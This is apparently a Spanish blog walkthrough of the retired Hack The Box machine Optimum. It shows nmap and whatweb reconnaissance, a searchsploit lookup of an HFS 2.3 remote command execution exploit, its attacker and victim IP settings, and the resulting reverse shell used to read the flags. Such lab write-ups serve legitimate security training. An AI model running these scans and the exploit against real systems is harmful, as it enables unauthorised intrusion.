Resolución Máquina Optimum

Dec 09, 2022
3 minutos a leer

En este post explico paso por paso como hacer la máquina optimum de Hack The Box desde 0, es una máquina nivel Fácil, tiene windows y ya está retirada

Reconocimiento

Para empezar lo primero es comprobar si la máquina está activa y que OS tiene

❯ ping -c 1 10.10.10.8
PING 10.10.10.8 (10.10.10.8) 56(84) bytes of data.
64 bytes from 10.10.10.8: icmp_seq=1 ttl=127 time=37.6 ms

--- 10.10.10.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 37.551/37.551/37.551/0.000 ms

En este caso da un ttl (time to live) de 127. Entendiendo que ttl=64: Linux / ttl=128: Windows, esta máquina es Windows por aproximación

Escaneo de puertos (nmap)

Ahora empezamos con un escaneo de puertos

❯ sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.10.8 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 14:03 CET
Initiating SYN Stealth Scan at 14:03
Scanning 10.10.10.8 [65535 ports]
Discovered open port 80/tcp on 10.10.10.8
Parámetro Función
-p- Para que el escaneo sea a todos los puertos (65536)
–open Para que solo reporte los puertos abiertos
-sS –min-rate 5000 Definir el tiempo del escaneo
-n Omitir resolución DNS
-vvv Para que vaya reportando lo que encuentre por consola
-Pn Skip host discovery
-oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPorts

El nmap a encontrado el puerto 80 (Este puerto es el que se usa para la navegación web de forma no segura HTTP)

Whatweb

Con el whatweb podemos ver información sobre la web

❯ whatweb 10.10.10.8
http://10.10.10.8 [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]

Searchsploit

Con searchsploit podemos comprobar si existe algún exploit para el HFS versión 2.3 que reporto el whatweb

¿Qué es HFS?

HTTP File Server, también conocido como HFS, es un servidor web gratuito diseñado específicamente para publicar y compartir archivos

❯ searchsploit HFS 2.3
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution | windows/remote/49584.py
-------------------------------------------------------- ---------------------------------

Explotación de Vulnerabilidades

Si es vulnerable y hay un exploit en python. Con searchsploit -m 49584.py lo pasamos a la ruta actual. Antes de usarlo hay que cambiar unas cosas del archivo.

En lhost y lport va el puerto en el que te quieres poner en escucha y la ip de tú máquina y en rhost y rport va la ip y el puerto de la máquina víctima

lhost = "10.10.14.2"
lport = 443
rhost = "10.10.10.8"
rport = 80

Ahora ya se puede ejecutar con python3 49584.py

listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.8] 49158

PS C:\Users\kostas\Desktop>

Flags

Ya tenemos una consola interactiva con la 10.10.10.8, con un cat user.txt tenemos la flag del user y con un cat ../../Administrator/Desktop/root.txttenemos la flag de root

¡¡¡Máquina resuelta!!!
